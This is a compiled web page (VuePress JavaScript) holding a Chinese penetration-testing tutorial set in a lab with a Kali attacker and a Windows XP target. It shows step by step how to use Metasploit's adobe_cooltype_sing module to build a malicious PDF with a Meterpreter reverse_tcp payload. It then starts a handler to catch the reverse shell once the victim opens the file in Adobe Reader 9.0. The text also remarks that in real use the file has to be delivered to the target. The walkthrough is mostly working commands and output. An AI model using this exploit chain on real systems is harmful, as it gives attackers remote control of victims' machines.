import{i as e,r as t,s as n,t as r}from"./app-DH4mVKN4.js";var i=JSON.parse(`{"path":"/md/hack/client/2022-05-02-004-%E5%9F%BA%E4%BA%8EPDF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB.html","title":"基于PDF文件格式的渗透攻击","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"基于PDF文件格式的渗透攻击","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"基于PDF文件格式的渗透攻击","lock":"need"},"git":{"updatedTime":1777440209000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"},{"name":"Claude Sonnet 4.6","username":"","email":"noreply@anthropic.com","commits":1}],"changelog":[{"hash":"dfed50e61131b09c729d1e8ca8a6567f91a521cf","time":1777440209000,"email":"“1028386804@qq.com”","author":"binghe001","message":"Merge feature/upgrade-vuepress2: fix search box position and layout","coAuthors":[{"name":"Claude Sonnet 4.6","email":"noreply@anthropic.com"}]}]},"filePathRelative":"md/hack/client/2022-05-02-004-基于PDF文件格式的渗透攻击.md"}`),a={name:`2022-05-02-004-基于PDF文件格式的渗透攻击.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="基于pdf文件格式的渗透攻击" tabindex="-1"><a class="header-anchor" href="#基于pdf文件格式的渗透攻击"><span>基于PDF文件格式的渗透攻击</span></a></h1><p>攻击机 Kali 192.168.175.128</p><p>靶机 WinXP 192.168.175.130</p><p>漏洞程序： Adobe Reader 9.0</p><h2 id="生成pdf文件" tabindex="-1"><a class="header-anchor" href="#生成pdf文件"><span>生成PDF文件</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/fileformat/adobe_cooltype_sing </span>
...
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体如下所示：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msf5 <span class="token operator">&gt;</span> use exploit/windows/fileformat/adobe_cooltype_sing </span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
...
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
...
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options</span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   FILENAME  msf.pdf          <span class="token function">yes</span>       The <span class="token function">file</span> name.</span>
<span class="line"></span>
<span class="line"></span>
...
<span class="line">   LHOST     <span class="token number">192.168</span>.175.128  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
...
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token string">&#39;msf.pdf&#39;</span> file<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> msf.pdf stored at /root/.msf4/local/msf.pdf</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/adobe_cooltype_sing<span class="token punctuation">)</span> <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到在/root/.msf4/local/目录下生成了msf.pdf。</p><p>实际中，我们需要想办法将这个文件传到靶机上。这里为了简单，我直接将文件拷贝到靶机上。</p><h2 id="上传pdf到靶机" tabindex="-1"><a class="header-anchor" href="#上传pdf到靶机"><span>上传PDF到靶机</span></a></h2><p>将生成的msf.pdf上传到靶机</p><h2 id="实施攻击" tabindex="-1"><a class="header-anchor" href="#实施攻击"><span>实施攻击</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msfconsole</span>
<span class="line">use exploit/multi/handler </span>
<span class="line"><span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
<span class="line">show options</span>
<span class="line"><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
<span class="line">exploit</span>
